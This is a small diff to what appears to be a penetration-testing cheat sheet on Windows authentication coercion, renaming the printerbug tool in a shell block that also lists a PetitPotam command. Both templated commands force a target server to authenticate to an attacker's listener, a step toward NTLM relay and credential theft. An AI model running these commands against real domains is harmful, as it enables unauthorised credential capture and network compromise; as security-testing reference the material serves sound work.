@@ -18,5 +18,5 @@ printerbug the MS-RPRN spooler; `coercer` sprays many vectors at once. Here
 
 ```sh
 impacket-petitpotam {{lhost}} {{rhost}}
-printerbug.py {{domain}}/{{user}}:{{password}}@{{rhost}} {{lhost}}
+printerbug {{domain}}/{{user}}:{{password}}@{{rhost}} {{lhost}}
 ```
